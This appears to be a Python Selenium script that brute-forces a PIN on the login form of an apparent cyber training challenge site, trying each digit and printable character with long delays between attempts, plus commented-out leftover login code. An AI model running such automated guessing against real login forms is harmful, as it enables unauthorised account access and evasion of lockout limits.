#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#<a href="/login" class="btn" style="background-color: #ff6000; color: #ffffff;">Guess the pin »</a>
#<input type="text" name="pin" class="form-control" placeholder="" value="" style="width:100%; margin-right:10px;">
#<button type="submit" class="btn" style="background-color:#ff6000; color:#ffffff; margin-bottom: 50px;">Sign In</button>
#<a href="/login" class="btn" style="background-color: #ff6000; color: #ffffff;">Enter Level 3 »</a>

import requests
import json
import urllib
import random
import string  
import selenium as sel
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

levels = {
      1:7,
      2:2,
      3:9,
      4:6,
      5:0,
      6:7,
      7:7,
      8:7,
      9:7,
      10:7
}
timetosleep = 305
print(levels.values())
webpage1 = "http://101.cybertrial.co.uk/login?mykey=a39KvztnMHrEqdXrhyuZddZPmTrLqEcqWRRwrhk4"
StrPoss = string.digits+string.printable
driver = webdriver.Firefox()
driver.get(webpage1)
try:
    #driver.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
    elementbtn = driver.find_element_by_class_name("btn")

except:
    time.sleep(timetosleep)
    elementbtn = driver.find_element_by_class_name("btn")
elementbtn.click()
#elementpin = driver.find_element_by_name("pin") #.find_element_by_id("email")
#elementpin.send_keys(str(2))
#elementpin.send_keys(Keys.RETURN)
#time.sleep(2)
#elementbtn = driver.find_element_by_class_name("btn")
#elementbtn.click()
#elementbtn.close()
for i in StrPoss:
    #if i not in str(levels.values()):
    print("Using:", i)
    elementpin = driver.find_element_by_name("pin") #.find_element_by_id("email")
    elementpin.send_keys(str(i))
    #element = driver.find_element_by_id("pass")
    #element.send_keys(password)
    elementpin.send_keys(Keys.RETURN)
    time.sleep(timetosleep)
    
    
    #elementpin.close()


#user_name = "YOUR EMAILID"
#password = "YOUR PASSWORD"






#sel
#import urllib2  
#import re  
#import cookielib 

##url = 'http://101.cybertrial.co.uk/login?mykey=a39KvztnMHrEqdXrhyuZddZPmTrLqEcqWRRwrhk4'  
##url = 'http://101.cybertrial.co.uk/login'
##inp = requests.get(url, "pin=1")
##print(inp)
#
# 
#  
##jar = cookielib.FileCookieJar("cookie")  
##opener = urllib.build_opener(urllib.HTTPCookieProcessor(jar))  
#  
##url = 'http://example.com/login.php' 
##user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' 
#  
##data = {  
#       "Submit": " ",  
#         "username":"x",  
#        "password":"x",  
#}  
#  
#data = urllib.urlencode(data)  
#login_request = urllib.Request(url, data)  
##login_reply = opener.open(login_request)  
##login_reply_data = login_reply.read()  
#  
#login_success_msg = re.compile("Login Successful")  
#  
##if login_success_msg.search(login_reply_data) is not None:  
##Procede 
##    print("Success")
##else:  
##    print ("Check whether you have given the right credentials")